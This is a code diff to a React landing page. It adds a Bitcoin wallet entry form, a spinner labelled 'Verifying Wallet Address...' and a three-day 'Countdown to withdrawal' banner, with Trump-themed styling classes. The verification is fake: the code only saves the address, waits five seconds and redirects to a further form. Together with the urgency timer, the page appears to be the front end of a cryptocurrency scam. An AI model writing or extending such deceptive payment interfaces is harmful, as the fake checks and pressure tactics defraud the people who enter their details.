@@ -1,7 +1,9 @@
-import React from "react";
+import React, { useState } from "react";
+import { useEffect } from "react";
 import Header from "../components/header";
 import { Check } from "lucide-react";
 import Footer from "../components/footer";
+import { useNavigate } from "react-router-dom";
 import {
   LineChart,
   Line,
@@ -21,10 +23,79 @@ const data = [
   { name: "Jul", value: 876650 },
 ];
 
-export default function Index() {
+export default function Home() {
+  const [btcAddress, setBtcAddress] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [timeLeft, setTimeLeft] = useState(null);
+
+  useEffect(() => {
+    const start = localStorage.getItem("timerStart");
+    if (!start) return;
+
+    const interval = setInterval(() => {
+      const now = Date.now();
+      const timeDiff = 3 * 24 * 60 * 60 * 1000 - (now - parseInt(start, 10)); // 3 days
+
+      if (timeDiff <= 0) {
+        setTimeLeft("00:00:00:00");
+        clearInterval(interval);
+      } else {
+        const days = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((timeDiff / (1000 * 60 * 60)) % 24);
+        const minutes = Math.floor((timeDiff / (1000 * 60)) % 60);
+        const seconds = Math.floor((timeDiff / 1000) % 60);
+        setTimeLeft(
+          `${String(days).padStart(2, "0")}:${String(hours).padStart(
+            2,
+            "0"
+          )}:${String(minutes).padStart(2, "0")}:${String(seconds).padStart(
+            2,
+            "0"
+          )}`
+        );
+      }
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, []);
+  const navigate = useNavigate();
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+
+    if (!btcAddress.trim()) {
+      alert("Please enter your BTC wallet address.");
+      return;
+    }
+    localStorage.setItem("btc_wallet", btcAddress);
+    setLoading(true);
+
+    setTimeout(() => {
+      navigate("/form");
+    }, 5000);
+  };
+
+  if (loading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-white">
+        <div className="text-center">
+          <p className="text-lg font-semibold text-gray-700 mb-4">
+            Verifying Wallet Address...
+          </p>
+          <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-500 border-opacity-50 mx-auto"></div>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="bg-white text-gray-800">
       <Header />
+      {timeLeft && (
+        <div className="w-full bg-yellow-100 text-yellow-800 py-2 text-center font-semibold text-sm">
+          ⏳ Countdown to withdrawal: {timeLeft} (Days:Hours:Minutes:Seconds)
+        </div>
+      )}
 
       <main className="space-y-6">
         {/* Hero Section */}
@@ -203,6 +274,29 @@ export default function Index() {
               </div>
             </div>
           </div>
+        </section>
+        <section className="flex w-full h-full justify-center ite">
+          <form
+            onSubmit={handleSubmit}
+            className="bg-white shadow-lg rounded-xl p-6 w-full max-w-md space-y-4"
+          >
+            <h2 className="text-xl font-bold text-[#05445e]">
+              Enter BTC Wallet
+            </h2>
+            <input
+              type="text"
+              value={btcAddress}
+              onChange={(e) => setBtcAddress(e.target.value)}
+              placeholder="e.g. bc1qw..."
+              className="w-full h-14 px-4 border border-trump-dark rounded-md focus:outline-none focus:ring-2 focus:ring-trump-primary"
+            />
+            <button
+              type="submit"
+              className="w-full bg-trump-primary text-white py-3 rounded-md font-semibold hover:bg-trump-dark transition bg-teal-600"
+            >
+              Submit
+            </button>
+          </form>
         </section>
       </main>
       <Footer></Footer>
